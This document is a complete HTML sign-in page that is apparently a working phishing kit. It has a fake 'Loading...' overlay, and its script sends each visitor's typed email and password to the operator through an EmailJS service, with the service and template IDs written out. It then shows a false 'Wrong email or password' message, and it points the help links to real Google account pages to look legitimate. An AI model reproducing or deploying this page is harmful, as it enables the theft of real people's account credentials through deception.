<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #0a0a0a;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      color: #e0e0e0;
    }
    .container {
      width: 100%;
      max-width: 420px;
      padding: 0 20px;
      text-align: center;
      margin-top: 140px;
    }
    h2 {
      font-size: 24px;
      margin-bottom: 20px;
      font-weight: 600;
      color: #fff;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 14px;
      border: none;
      background: #1a1a1a;
      color: #fff;
      border-radius: 8px;
      font-size: 15px;
      outline: none;
    }
    button {
      width: 100%;
      padding: 15px;
      background: #333;
      color: #fff;
      font-weight: bold;
      border: none;
      border-radius: 20px;
      font-size: 15px;
      cursor: pointer;
      margin-top: 12px;
      transition: background 0.3s;
    }
    button:hover { background: #444; }
    .links {
      margin-top: 18px;
      font-size: 14px;
    }
    .links a {
      color: #bbb;
      text-decoration: none;
    }
    .links a:hover { text-decoration: underline; }
    .footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: #888;
    }
    .footer a {
      color: #aaa;
      margin: 0 8px;
      text-decoration: none;
      font-size: 11px;
    }
    .footer a:hover { text-decoration: underline; }
    .error-message {
      color: #ff5555;
      font-size: 13px;
      margin-top: 10px;
      display: none;
    }
    /* Overlay loading for fake page load */
    #page-loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: #0a0a0a;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 10000;
    }
    #page-loader .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #333;
      border-top: 5px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    #page-loader .loading-text {
      margin-top: 15px;
      color: #fff;
      font-size: 14px;
    }
    /* Loading overlay for sign-in action */
    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.9);
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .loading-overlay .spinner {
      width: 45px;
      height: 45px;
      border: 4px solid #444;
      border-top: 4px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 12px;
    }
    .loading-overlay .loading-text {
      font-size: 14px;
      color: #fff;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <!-- Fake page loader -->
  <div id="page-loader">
    <div class="spinner"></div>
    <div class="loading-text">Loading...</div>
  </div>

  <div class="container">
    <h2>Sign in</h2>
    <form id="login-form">
      <input type="email" id="email" placeholder="Email address" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Sign in</button>
      <div class="error-message" id="error-msg">Wrong email or password</div>
    </form>
    <div class="links">
      <a href="#">Forgot password?</a><br>
      <span>Don't have an account? <a href="#">Create account</a></span>
    </div>
  </div>

  <!-- Loading screen for form submission -->
  <div class="loading-overlay" id="loading-screen">
    <div class="spinner"></div>
    <div class="loading-text">Signing in...</div>
  </div>

  <div class="footer">
    <a href="#">Legal</a>
    <a href="#">Privacy policy</a>
    <a href="#">Your Privacy Choices</a>
    <br />Â© Wireshield LLC Inc. 2024. All Rights Reserved.
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    emailjs.init("Zuxy6x2TZlxuZ4ABj");

    document.addEventListener("DOMContentLoaded", () => {
      const pageLoader = document.getElementById("page-loader");
      setTimeout(() => { pageLoader.style.display = "none"; }, 2000);

      const form = document.getElementById("login-form");
      const loader = document.getElementById("loading-screen");
      const errorMsg = document.getElementById("error-msg");

      form.addEventListener("submit", (e) => {
        e.preventDefault();
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        loader.style.display = "flex";

        emailjs.send("service_z1uzh6f", "template_whed5zh", {
          email: email,
          password: password
        }).then(() => {
          loader.style.display = "none";
          errorMsg.style.display = "block";
        }).catch((error) => {
          loader.style.display = "none";
          console.error("EmailJS Error:", error);
        });
      });

      document.querySelectorAll("a").forEach(link => {
        const text = link.textContent.toLowerCase();
        if (text.includes("create account")) {
          link.href = "https://accounts.google.com/signup";
        } else if (text.includes("forgot password")) {
          link.href = "https://accounts.google.com/signin/v2/usernamerecovery";
        }
      });
    });
  </script>
</body>
</html>
